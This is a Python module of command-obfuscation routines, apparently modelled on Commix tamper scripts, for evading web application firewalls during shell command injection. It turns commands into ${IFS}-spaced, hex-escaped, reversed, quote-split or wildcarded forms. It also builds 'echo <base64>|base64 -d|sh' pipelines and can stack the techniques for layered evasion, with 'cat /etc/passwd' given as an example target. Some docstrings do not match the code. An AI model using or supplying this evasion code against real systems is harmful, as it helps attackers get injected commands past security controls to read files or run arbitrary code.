import base64
import re

def obfuscate_command(cmd, technique):
    """WAF/filter bypass via command obfuscation. Implements 8 techniques
    derived from Commix tamper scripts (space2ifs, rev, singlequotes,
    hexencode, base64encode, uninitializedvariable, backticks).
    Returns the obfuscated command string."""
    TECHNIQUES = {
        'ifs': _obf_ifs,
        'hex': _obf_hex,
        'base64': _obf_base64,
        'rev': _obf_rev,
        'concat': _obf_concat,
        'wildcard': _obf_wildcard,
        'uninit_var': _obf_uninit_var,
        'double_quote': _obf_double_quote,
    }
    func = TECHNIQUES.get(technique)
    if func is None:
        raise ValueError('Unknown technique: %s. Available: %s' % (technique, ', '.join(TECHNIQUES)))
    return func(cmd)

def _obf_ifs(cmd):
    """Replace spaces with ${IFS} (Internal Field Separator). Commix space2ifs."""
    return cmd.replace(' ', '${IFS}')

def _obf_hex(cmd):
    """Encode each character as printf hex escape. Commix hexencode."""
    hex_chars = ''.join('\\x{:02x}'.format(ord(c)) for c in cmd)
    return "$(printf '%s')" % hex_chars

def _obf_base64(cmd):
    """Base64 encode command, decode and pipe to shell. Commix base64encode."""
    encoded = base64.b64encode(cmd.encode()).decode()
    return 'echo %s|base64 -d|sh' % encoded

def _obf_rev(cmd):
    """Reverse the command string, decode with rev at runtime. Commix rev tamper."""
    reversed_cmd = cmd[::-1]
    return '$(echo %s|rev)' % reversed_cmd

def _obf_concat(cmd):
    """Insert empty single-quote pairs between characters. Commix singlequotes.
    Example: cat -> c''a''t. Bash ignores adjacent empty quotes."""
    result = []
    for i, ch in enumerate(cmd):
        if ch.isalpha() and i > 0:
            result.append("''" + ch)
        else:
            result.append(ch)
    return ''.join(result)

def _obf_wildcard(cmd):
    """Replace binary path characters with glob wildcards.
    /bin/cat -> /b?n/c?t, /usr/bin/id -> /u?r/b?n/i?"""
    WILDCARD_MAP = {
        '/bin/cat': '/b?n/c?t',
        '/bin/sh': '/b?n/s?',
        '/bin/bash': '/b?n/b?sh',
        '/usr/bin/id': '/u?r/b?n/i?',
        '/usr/bin/whoami': '/u?r/b?n/wh??mi',
        '/bin/ls': '/b?n/l?',
        '/bin/rm': '/b?n/r?',
        '/bin/nc': '/b?n/n?',
    }
    result = cmd
    for path, wildcard in WILDCARD_MAP.items():
        result = result.replace(path, wildcard)
    # Generic: replace vowels in path components after /
    if result == cmd:
        result = re.sub(r'(?<=/)(\w)(\w)', lambda m: m.group(1) + '?', result)
    return result

def _obf_uninit_var(cmd):
    """Insert uninitialized variable between chars. Commix uninitializedvariable.
    Example: cat -> ${ZZ}c${ZZ}a${ZZ}t. Unset vars expand to empty string."""
    var = '${XX}'
    return ''.join(var + ch if ch.isalpha() else ch for ch in cmd)

def _obf_double_quote(cmd):
    """Wrap each command word in double quotes with internal splits.
    Example: cat /etc/passwd -> c""a""t /e""t""c/p""a""s""s""w""d"""""
    return re.sub(r'([a-zA-Z])', r'\1""', cmd)

def obfuscate_multi(cmd, techniques):
    """Apply multiple obfuscation techniques in sequence (layered evasion)."""
    result = cmd
    for tech in techniques:
        result = obfuscate_command(result, tech)
    return result

